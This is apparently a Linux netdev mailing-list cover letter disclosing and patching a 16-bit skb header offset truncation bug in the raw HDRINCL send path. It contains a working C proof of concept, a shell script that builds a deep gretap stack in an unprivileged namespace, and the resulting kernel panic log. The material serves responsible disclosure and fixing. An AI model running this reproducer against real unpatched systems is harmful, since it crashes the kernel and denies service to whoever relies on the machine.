Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B6AF4451988
	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 18:41:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785350468; cv=none; b=T0gJz6faWST7VKVcwtufendOSizzEEHZcrLReVUPwf14Lgp/RPi+aYzxARF2OcC68qBFEmrPbhWYINcKe46msv2CJn0zZKTJL3ddMBdYvc5miP3eSe2VJxq+u4qso660KBjH9x6RfBYrsaUigV0EupoKJFhDmjl6e9Nimet3SPo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785350468; c=relaxed/simple;
	bh=155b4fC8m0O8M48rTo+3sm0RTJCBr0N26/hyyt53bPI=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=gvnKeUYyT/+Si1mrDYkW9P55zuZYFRUkGSj1pNudhCCgAS36H+3YQY8Ll4QTqE31MuEcU+js/Jtbfamd6DMp1nY6QAd1tDEQtuExHHgYEBY75Me7PgPdR/VS9fIztARShDD0650gPd0xf36MK7NxgkzNTe5hab248zRT1vduDEQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=TTgOfw6r; arc=none smtp.client-ip=209.85.214.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="TTgOfw6r"
Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2d01663d816so12342535ad.1
        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 11:41:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785350465; x=1785955265; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=h2q60sPAp+gi0TJEDXn/3BkbZqvF7izSDcymK2RoM6o=;
        b=TTgOfw6rXkPo/nlji8YoySWy/UkI0oCUfuPjE8XY4eviyAkwXI/I4s6pTMU5JlaiAl
         5tGKe44Vx6UPoxOlOe5QviAaoy3oo/7r5f3gQqFL3BvVNTTCGGcsZkJRqq9fQ7t11m3t
         kf9XrauVjyfEUbjqb5OwVantayWqe4I4nW2VggrPTBYKdW612omwVvyiqj2Min3IXfHc
         egURN4gdqpCvn7D8LdH8E80q/jHcKgsPRxOyj+1swAkAyJti2dvo25JRiVHWRcLMuePJ
         xLZfQ2TRqwv8gXvgs+1PyTmoHG8aezRRqZzkA8C7m1POr0VukUQk9RHtetLs7cDZLudd
         E1Wg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785350465; x=1785955265;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=h2q60sPAp+gi0TJEDXn/3BkbZqvF7izSDcymK2RoM6o=;
        b=bfQD2HEVB0w0Nm9OYqaGLrAKnLSD9UBq1wgC04ILff+DziOuQNFYGQf9GB8JT8iDa2
         Qi8NOY4ViOXkobDnEbvXNcp9VF/BNMskx/TlClIV5LROqBsIHR/O2IBkmDj86nt9bCOr
         4nunv6NKTwd2+hfYDWTc8NRZRHZVGTQt8TJWK3Ef8WzY8cbUHH1x0XYTX6MbfGN+c3DR
         rPaToUjED/x6PMS8jXMilPjLLb4AbNmAgKE/oxk3pTMwWfHH4H9s5hS70F7q+9q1abUt
         zf9Ke4ZsHPuoDqYBt5fezjviQmIuMP1I+6Wi68vwZ2CoC7weC9W3t8rDMuY58vEoCHEa
         NV0w==
X-Gm-Message-State: AOJu0YwRzSx9YLGm9DgPoAPjkNoImNhpUVl5IxxZ7uqL811MDBG+9wuw
	4NrOl3FuwkgBVA3AYyqDyJ3ucFVKfH3gDLcahXKw05J3iH19nUO6Bk8njcxughtNfM49kCZnCiS
	Pwu6V5/Um
X-Gm-Gg: AR+sD12IXdJRIjltUgFkjiFoOOr/kDLS2x/ksOTy6dElq8+U9GK8xIhDV17PnCv6i1q
	j3sC/Maq1qQgStxQbP7LY7nIzFAaLqutHZOZCj5X3GHublpKHH0z9PQ5pRvxRzH5DcXl2z9Xtal
	1JUuPkpqjYtTB0ik2SlPPquWtKqX3R1HEohCJrcisIM4qnoT4/aFVk3QKS0mmDOIORDa7uV0A4s
	Vx+reVQmve6cMuL2PSS8Vcx0PyLNq6NoFIiRW+kxrGUDVdsA3vf6IZYU3C8Mc47YtSJCb2nBhw1
	wV15Jr1nGhmCuf2guaoERr+yyS4nl1g+yvVyhKOx62ECQKRyMfr+lKaBE+qTmea8a47r5KBLMAP
	DBxumK12fMGFRv4wkTDphlGLypNb7Lc4CUi8HXyPLrAbzOM/D7KLpbqRzBM/EDHuT7aWXP3CZMw
	XaBA13oPhpYlcKwsV5PLbL0xPt3D8aA+t1qd4xfAOEpbflY8hTwPg7Qn7CO640FpUuyO3lydfoV
	yBxuHWPDw==
X-Received: by 2002:a17:902:e945:b0:2c0:b6c7:227e with SMTP id d9443c01a7336-2d033d662b1mr217925ad.5.1785350464880;
        Wed, 29 Jul 2026 11:41:04 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d022a18abasm15637545ad.5.2026.07.29.11.40.59
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 11:41:04 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	kerneljasonxing@gmail.com,
	kuniyu@google.com,
	bjorn@kernel.org,
	bigeasy@linutronix.de,
	jiayuan.chen@linux.dev,
	willemb@google.com,
	jlayton@kernel.org,
	gustavoars@kernel.org,
	michael.bommarito@gmail.com,
	runyu.xiao@seu.edu.cn,
	kees@kernel.org,
	lirongqing@baidu.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/1] net: skbuff: reject skb header offset updates that truncate
Date: Wed, 29 Jul 2026 18:40:32 +0000
Message-ID: <cover.1785346409.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/raw.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

raw_send_hdrinc() and rawv6_send_hdrinc() reserve LL headroom before storing
skb header offsets in 16-bit fields. The skb header offsets are 16-bit values
since commit 1a37e412a022 ("net: Use 16bits for *_headers fields of struct
skbuff"), and U16_MAX is also the unset sentinel for transport_header.

With a deep gretap stack, the effective hard_header_len + needed_headroom can
grow to 65534 and LL_RESERVED_SPACE() rounds that up to 65536. On the IPv4
hdrincl path, skb_reserve(skb, hlen) followed by skb_reset_network_header(skb)
stores skb->data - skb->head in the 16-bit network_header field. When hlen
reaches 65536, that stored offset truncates to 0. raw_send_hdrinc() then copies
the userspace IPv4 header to ip_hdr(skb) at the wrapped offset, and the
malformed skb later crashes in eth_header() during the raw send path.

IPv4 also has a second boundary at hlen + iphlen, because the transport header
is advanced by the user-controlled IPv4 header length. The lower-level issue is
more general than raw.c itself: once an skb already contains large 16-bit
header offsets, later positive skb header offset updates can wrap those values
or turn transport_header into the U16_MAX sentinel.

The initial raw route is not the only place that matters. LOCAL_OUT can reroute
the skb, XFRM can add dst->header_len, and LWT or other output paths can grow
or copy the skb state later. A raw-only final callback check or a
pskb_expand_head()-only guard is therefore too narrow. The fix keeps the raw
hdrincl initial bounds, rejects later positive skb header offset updates in
net/core/skbuff.c before they would overflow the stored 16-bit values, and also
rejects later transport_header recomputations in net/xfrm/xfrm_output.c before
they would overflow or hit the U16_MAX sentinel.

A related public proposal titled "net: reject IP sends with excessive
headroom" exists, but it is not a previous version of this series. It
rejects selected IP output callers before they store large offsets; this
patch instead keeps the raw HDRINCL entry checks and also validates later
positive skb header offset updates.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

The inline poc.c is only the raw sender. For the reproduced crash, run the
wrapper below instead so that the gretap stack and the default g1560 interface
used by poc.c are created first:

    chmod +x poc.sh
    unshare -Urn ./poc.sh

On the fixed kernel, the same isolated trigger path returns
sendto: Invalid argument instead of crashing.

We did not switch this reproducer to packetdrill because the core trigger
requires creating and chaining a very deep gretap device stack first, while
packetdrill is not a good fit for expressing that netdevice construction
workflow.
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <netinet/ip.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static uint16_t ip_checksum(const void *buf, size_t len)
{
	const uint8_t *p = buf;
	uint32_t sum = 0;

	while (len > 1) {
		sum += ((uint32_t)p[0] << 8) | p[1];
		p += 2;
		len -= 2;
	}

	if (len)
		sum += (uint32_t)p[0] << 8;

	while (sum >> 16)
		sum = (sum & 0xffffU) + (sum >> 16);

	return (uint16_t)~sum;
}

int main(int argc, char **argv)
{
	static const char payload[] = "ABCD";
	const char *ifname = argc > 1 ? argv[1] : "g1560";
	const char *dst_str = argc > 2 ? argv[2] : "192.0.2.2";
	const char *src_str = argc > 3 ? argv[3] : "192.0.2.1";
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
	};
	struct iphdr iph = {
		.version = 4,
		.ihl = 5,
		.tos = 0,
		.tot_len = htons(sizeof(struct iphdr) + sizeof(payload) - 1),
		.id = htons(0x1234),
		.frag_off = 0,
		.ttl = 64,
		.protocol = 253,
		.check = 0,
	};
	unsigned char packet[sizeof(iph) + sizeof(payload) - 1];
	int fd;
	ssize_t n;

	if (inet_pton(AF_INET, src_str, &iph.saddr) != 1) {
		fprintf(stderr, "bad src %s\n", src_str);
		return 1;
	}
	if (inet_pton(AF_INET, dst_str, &iph.daddr) != 1) {
		fprintf(stderr, "bad dst %s\n", dst_str);
		return 1;
	}
	if (inet_pton(AF_INET, dst_str, &dst.sin_addr) != 1) {
		fprintf(stderr, "bad sockaddr dst %s\n", dst_str);
		return 1;
	}

	iph.check = ip_checksum(&iph, sizeof(iph));
	memcpy(packet, &iph, sizeof(iph));
	memcpy(packet + sizeof(iph), payload, sizeof(payload) - 1);

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	{
		int one = 1;

		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
			perror("setsockopt(IP_HDRINCL)");
			close(fd);
			return 1;
		}
		if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, ifname,
			       strlen(ifname) + 1) < 0) {
			perror("setsockopt(SO_BINDTODEVICE)");
			close(fd);
			return 1;
		}
	}

	n = sendto(fd, packet, sizeof(packet), 0,
		   (struct sockaddr *)&dst, sizeof(dst));
	if (n < 0) {
		perror("sendto");
		close(fd);
		return 1;
	}

	printf("sent %zd bytes via %s to %s\n", n, ifname, dst_str);
	close(fd);
	return 0;
}
------END poc.c--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DEPTH="${DEPTH:-1560}"
TOP="g${DEPTH}"

if ip route show default 2>/dev/null | grep -q .; then
	echo "run inside an isolated netns, e.g. unshare -n $0 or unshare -Urn $0" >&2
	exit 1
fi

ip link add dummy0 type dummy
ip link set dummy0 up mtu 100000

lower="dummy0"
i=1
while [ "$i" -le "$DEPTH" ]; do
	a=$(( (i / 250) % 250 + 1 ))
	b=$(( i % 250 + 1 ))
	lip="10.${a}.${b}.1"
	rip="10.${a}.${b}.2"
	ip link add "g${i}" type gretap local "${lip}" remote "${rip}" dev "${lower}" key 1
	lower="g${i}"
	i=$((i + 1))
done

ip link set "${TOP}" up
ip addr add 192.0.2.1/24 dev "${TOP}"
ip neigh replace 192.0.2.2 lladdr 02:11:22:33:44:55 nud permanent dev "${TOP}"

exec ./poc "${TOP}" 192.0.2.2 192.0.2.1
------END poc.sh--------

The crash log below is taken from the local decode_stacktrace.sh
output on the latest selected baseline, and this refreshed decode
now resolves the key frames to file:line locations.

----BEGIN crash log----
[   52.208710] BUG: unable to handle page fault for address: ffffa3986611fffe
[   52.220274] #PF: supervisor write access in kernel mode
[   52.228822] #PF: error_code(0x0002) - not-present page
[   52.239552] PGD 73065067 P4D 73065067 PUD 0 
[   52.249792] Oops: Oops: 0002 [#1] SMP NOPTI
[   52.257276] CPU: 0 UID: 0 PID: 491 Comm: poc Not tainted 7.2.0-rc4-00390-g743916aa8e8c-dirty #2 PREEMPT(lazy)
[   52.275220] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   52.313650] RIP: 0010:eth_header (net/ethernet/eth.c:86)
[   52.420112] RSP: 0018:ffffa39840b8b640 EFLAGS: 00010246
[   52.431246] RAX: ffffa3986611fff2 RBX: 0000000000000000 RCX: 0000000000000014
[   52.445426] RDX: 000000000000000e RSI: 0000000000000000 RDI: ffff98744c7cb5f8
[   52.460207] RBP: 000000000e000000 R08: 00000000ffffa398 R09: 0000000000000000
[   52.474828] R10: 0000000000000000 R11: 0000000000000000 R12: 000000000000000e
[   52.490089] R13: 0000000000000014 R14: ffff98744c7cb5f8 R15: ffffa3986611fff2
[   52.585894] Call Trace:
[   52.588953]  <TASK>
[   52.591902]  neigh_resolve_output+0xe3/0x1c0
[   52.597910]  ip_finish_output2+0x156/0x510
[   52.603665]  ip_output+0xb9/0x170
[   52.616159]  raw_sendmsg (net/ipv4/raw.c:677)
[   52.638531]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
[   52.643321]  __x64_sys_sendto+0x1f/0x30
[   52.648330]  do_syscall_64+0xf9/0x540
[   52.653123]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   52.998357] Kernel panic - not syncing: Fatal exception
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  net: skbuff: reject skb header offset updates that truncate

 include/linux/skbuff.h  | 28 ++++++++++++
 net/core/skbuff.c       | 94 ++++++++++++++++++++++++++++++++++++++---
 net/ipv4/esp4_offload.c | 15 ++++---
 net/ipv4/raw.c          |  4 ++
 net/ipv6/esp6_offload.c | 15 ++++---
 net/ipv6/raw.c          |  4 ++
 net/xfrm/xfrm_device.c  | 38 ++++++++++++-----
 net/xfrm/xfrm_iptfs.c   |  6 ++-
 net/xfrm/xfrm_output.c  | 21 ++++++---
 9 files changed, 189 insertions(+), 36 deletions(-)

-- 
2.43.0

